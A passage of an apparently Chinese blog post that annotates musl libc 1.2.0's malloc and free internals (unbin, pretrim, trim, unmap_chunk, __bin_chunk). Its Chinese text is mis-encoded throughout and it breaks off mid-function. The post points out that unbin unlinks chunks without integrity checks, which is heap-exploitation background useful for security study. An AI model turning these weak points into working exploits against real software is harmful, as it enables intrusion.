          <a href="#3-å…³é”®å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…³é”®å‡½æ•°" class="headerlink" title="3.å…³é”®å‡½æ•°"></a>3.å…³é”®å‡½æ•°</h2>
      
        <h3 id="1-mallco"   >
          <a href="#1-mallco" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-mallco" class="headerlink" title="(1)mallco"></a>(1)mallco</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è°ƒæ•´nå¤§å°ï¼Œå¯¹é½0x20</span></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¦‚æœnå¤§äºMMAP_THRESHOLD (0x38000)ï¼Œä½¿ç”¨ mmap</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="keyword">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¡ç®—å¯¹åº”çš„binmapä¸‹æ ‡i</span></span><br><span class="line">	i = bin_index_up(n);</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//æŸ¥æ‰¾binmap</span></span><br><span class="line">		<span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//å¦‚æœbinå‡ä¸ºç©ºï¼Œé‚£ä¹ˆè°ƒç”¨expand_heapå‡½æ•°å»¶å±•å †ç©ºé—´ï¼Œç”Ÿæˆæ–°çš„chunkè¿”å›</span></span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">			c = expand_heap(n);</span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è·å–å¤§å°æœ€æ¥è¿‘n(size)çš„å¯ç”¨binä¸‹æ ‡j</span></span><br><span class="line">		j = first_set(mask);</span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">        <span class="comment">//BIN_TO_CHUNKä¸çŸ¥é“ä»€ä¹ˆå‡½æ•°</span></span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;ã€</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ pretrimåˆ¤æ–­cçš„å¤§å°å’Œéœ€æ±‚çš„size(n)ï¼Œç›¸å·®å¤ªå¤§å°±åˆ‡å‰²</span></span><br><span class="line">            <span class="comment">//å¦åˆ™ä½¿ç”¨ unlockä»é“¾è¡¨ä¸­å–å‡º</span></span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    <span class="comment">//åˆ‡å‰²ä¹‹åå›æ”¶ c ä¸­å¤§å°è¶…è¿‡ n çš„éƒ¨åˆ†</span></span><br><span class="line">	trim(c, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="è¯¦ç»†æ­¥éª¤ï¼š"   >
          <a href="#è¯¦ç»†æ­¥éª¤ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¯¦ç»†æ­¥éª¤ï¼š" class="headerlink" title="è¯¦ç»†æ­¥éª¤ï¼š"></a>è¯¦ç»†æ­¥éª¤ï¼š</h4>
      <ul>
<li><p>è°ƒæ•´ nï¼Œå¯¹é½0x20</p>
</li>
<li><p> å¦‚æœ n &gt; MMAP_THRESHOLD (0x38000)ï¼Œä½¿ç”¨ mmap åˆ›å»ºä¸€å—å¤§å°ä¸º n çš„å†…å­˜ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚</p>
</li>
<li><p>å¦‚æœ n &lt;= MMAP_THRESHOLD (0x38000)ï¼Œè®¡ç®— n å¯¹åº”çš„ bin ä¸‹æ ‡ iï¼ŒæŸ¥æ‰¾ binmap</p>
<ul>
<li><p>å¦‚æœæ‰€æœ‰çš„å¯ç”¨ bin å‡ä¸ºç©ºï¼Œè°ƒç”¨expand_heapå‡½æ•°å»¶å±•å †ç©ºé—´ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ chunkè¿”å›</p>
</li>
<li><p>å¦‚æœå­˜åœ¨éç©ºçš„å¯ç”¨ binï¼Œé€‰æ‹©å¤§å°æœ€æ¥è¿‘ n çš„ bins[j]ï¼Œå¾—åˆ° bin é“¾è¡¨é¦–éƒ¨çš„ chunk c<br>å¦‚æœç¬¦åˆ pretrim æ¡ä»¶ï¼Œä½¿ç”¨ pretrim åˆ†å‰² cï¼Œå¦åˆ™ä½¿ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º cï¼Œæœ€åå°†åˆ†å‰²å‰©ä¸‹çš„chunkè¿›å…¥trimå‡½æ•°å›æ”¶ï¼Œå°†cè¿”å›ç»™ç”¨æˆ·ã€‚</p>
</li>
</ul>
</li>
</ul>
<p>è‡³äºé‚£ä¸ªunlock_binå¥½åƒæ˜¯åŒæ­¥ç”¨çš„ï¼Œåº”è¯¥æ˜¯å¤šçº¿ç¨‹é˜²æ­¢ç«äº‰è¯»å†™å§ï¼Œä¸å¤ªæ‡‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="comment">/* Synchronization tools */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (libc.threads_minus_1)</span><br><span class="line">		<span class="keyword">while</span>(a_swap(lk, <span class="number">1</span>)) __wait(lk, lk+<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (lk[<span class="number">0</span>]) &#123;</span><br><span class="line">		a_store(lk, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (lk[<span class="number">1</span>]) __wake(lk, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	lock(mal.bins[i].lock);</span><br><span class="line">	<span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">		mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	unlock(mal.bins[i].lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘ unbin"   >
          <a href="#â‘ unbin" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ unbin" class="headerlink" title="â‘ unbin"></a>â‘ unbin</h4>
      <p>ç±»ä¼¼äºunlinkçš„è§£é“¾æ“ä½œï¼Œæ— ä»»ä½•æ£€æµ‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">//è§£é“¾</span></span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">//è®¾ç½® INUSE æ ‡å¿—ä½ï¼ŒåŒé‡æ ‡å¿—ä½éƒ½ä¼šè®¾ç½®</span></span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡pretrim"   >
          <a href="#â‘¡pretrim" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡pretrim" class="headerlink" title="â‘¡pretrim"></a>â‘¡pretrim</h4>
      <p>åˆ‡å‰²chunkï¼Œéœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶æ‰ä¼šè¿›è¡Œåˆ‡å‰²æ“ä½œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="comment">/* pretrim - trims a chunk _prior_ to removing it from its bin.</span></span><br><span class="line"><span class="comment"> * Must be called with i as the ideal bin for size n, j the bin</span></span><br><span class="line"><span class="comment"> * for the _free_ chunk self, and bin j locked. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// æ¡ä»¶ 1:j(å¤§å°æœ€æ¥è¿‘sizeçš„å¯ç”¨binä¸‹æ ‡)å¤§äº 40</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ¡ä»¶ 2: j(å¤§å°æœ€æ¥è¿‘sizeçš„å¯ç”¨binä¸‹æ ‡)ä¸i(è®¡ç®—å‡ºæ¥çš„binä¸‹æ ‡)ç›¸éš” 3 ä¸ª bin æˆ–ä»¥ä¸Šï¼Œ</span></span><br><span class="line">    <span class="comment">// æˆ–è€…j(å¤§å°æœ€æ¥è¿‘sizeçš„å¯ç”¨binä¸‹æ ‡)ç­‰äº63ä¸”sizeç›¸å·®å¤§äº MMAP_THRESHOLD(0x38000)</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">		<span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ¡ä»¶3: sizeç›¸å·®çš„æ•°å€¼å±äºbins[j]çš„èŒƒå›´å†…ï¼Œå³splitä¸selfå±äºåŒä¸€ä¸ªbin</span></span><br><span class="line">	<span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ‡å‰²å‡ºä¸€å—å¤§å°ä¸ºnçš„chunkç”¨æ¥è¿”å›</span></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;prev = self-&gt;prev;</span><br><span class="line">	split-&gt;next = self-&gt;next;</span><br><span class="line">	split-&gt;prev-&gt;next = split;</span><br><span class="line">	split-&gt;next-&gt;prev = split;</span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n;</span><br><span class="line">	next-&gt;psize = n1-n;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å–ä¸ªåå­—å¥½å¬ç‚¹ï¼š</p>
<p><code>Jï¼šsearch_bin_idx</code></p>
<p><code>Iï¼šcalc_bin_idx</code></p>
<p><code>nï¼šneed_size</code></p>
<p>æ€»çš„æ¡ä»¶å¦‚ä¸‹ï¼š</p>
<ul>
<li><p><code>search_bin_idx</code>å¤§äº 40</p>
</li>
<li><p><code>search_bin_idx</code>ä¸<code>calc_bin_idx</code>ç›¸éš” 3 ä¸ª bin æˆ–ä»¥ä¸Šï¼Œæˆ–è€…<code>search_bin_idx</code>ç­‰äº63ä¸”<code>bins[search_bin_idx].head-&gt;size - need_size &gt; MMAP_THRESHOLD(0x38000)</code></p>
</li>
<li><p><code>bins[search_bin_idx].head-&gt;size - need_size</code>çš„å€¼åœ¨<code>bins[search_bin_idx]</code>ä¸­</p>
</li>
</ul>
<p>å³åœ¨å°†Chunkæ‹¿å‡ºbinä¹‹å‰ï¼Œå…ˆè¿›è¡Œåˆ‡å‰²èµ‹å€¼ï¼Œè®¾ç½®å¯¹åº”çš„æŒ‡é’ˆï¼Œç„¶åæ‰è§£é“¾ï¼Œchunkè¿˜æ˜¯ä»binä¸­æ‰¾åˆ°çš„chunkï¼Œä¹‹ååœ¨unbinä¸­è¿›è¡Œinuseä½çš„ä¿®æ”¹ã€‚</p>

        <h4 id="â‘¢trim"   >
          <a href="#â‘¢trim" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢trim" class="headerlink" title="â‘¢trim"></a>â‘¢trim</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç±»ä¼¼äºunsortebinä¸­å¦‚æœå¤šå‡ºæ¥çš„sizeå°äº0x10ï¼Œé‚£å°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·ä¸€æ ·</span></span><br><span class="line">    <span class="comment">//DONTCARE(0x10)ï¼Œä¹Ÿå°±æ˜¯ç¡®ä¿å›æ”¶çš„chunkçš„sizeè‡³å°‘ä¸º0x10ï¼Œchunkè‡³å°‘0x20å¯¹é½</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n | C_INUSE;</span><br><span class="line">	next-&gt;psize = n1-n | C_INUSE;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†å¤šä½™çš„chunké‡Šæ”¾åˆ° bin</span></span><br><span class="line">	__bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-free"   >
          <a href="#2-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free" class="headerlink" title="(2)free"></a>(2)free</h3>
      <p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå¦‚æœcsizeæ²¡æœ‰è®¾ç½®æ ‡å¿—ä½ï¼Œå°±æœ‰ä¸¤ç§å¯èƒ½ï¼Œè¦ä¹ˆæ˜¯double freeï¼Œè¦ä¹ˆæ˜¯mmapå‡ºæ¥çš„chunkã€‚æ‰€ä»¥è¿›å…¥unmap_chunkå‡½æ•°ä»”ç»†åˆ¤æ–­ï¼Œå¦åˆ™å°±æ˜¯è®¾ç½®äº†æ ‡å¿—ä½ï¼Œæ­£å¸¸è¿›å…¥__bin_chunkå‡½æ•°è¿›è¡Œé‡Šæ”¾ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line">	<span class="comment">//åˆ¤æ–­csizeæ˜¯å¦è®¾ç½®äº†æ ‡å¿—ä½</span></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);<span class="comment">//æ£€æµ‹psizeå­—æ®µ</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);<span class="comment">//æ­£å¸¸é‡Šæ”¾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘ unmap-chunk"   >
          <a href="#â‘ unmap-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ unmap-chunk" class="headerlink" title="â‘ unmap_chunk"></a>â‘ unmap_chunk</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">	<span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">	<span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">	<span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="comment">//å¦‚æœpsizeå­—æ®µè®¾ç½®inuseä½ï¼Œç›´æ¥crash</span></span><br><span class="line">	<span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    <span class="comment">//å¦åˆ™ä½œä¸ºmmap chunkè¿›å…¥é‡Šæ”¾å‡½æ•°</span></span><br><span class="line">	__munmap(base, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡-bin-chunk"   >
          <a href="#â‘¡-bin-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡-bin-chunk" class="headerlink" title="â‘¡__bin_chunk"></a>â‘¡__bin_chunk</h4>
      <p>æ­£å¸¸çš„é‡Šæ”¾å‡½æ•°ï¼Œé¦–å…ˆåˆå¹¶ chunk å‰åçš„ç©ºé—² chunkã€è®¾ç½® binmap å’Œ chunk æ ‡å¿—ä½ï¼Œæœ€åå°† chunk æ’å…¥åˆ°å¯¹åº”çš„ bin é“¾è¡¨ä¸­ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////v1.2.0  src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">	<span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">	<span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">   	<span class="comment">//è‹¥ä¸‹ä¸€ä¸ª chunk çš„ psize ä¸ç­‰äº self çš„ csizeï¼Œåˆ™ crash</span></span><br><span class="line">    <span class="comment">//ç›¸å½“äºæ£€æµ‹pre_sizeå’Œsize</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span 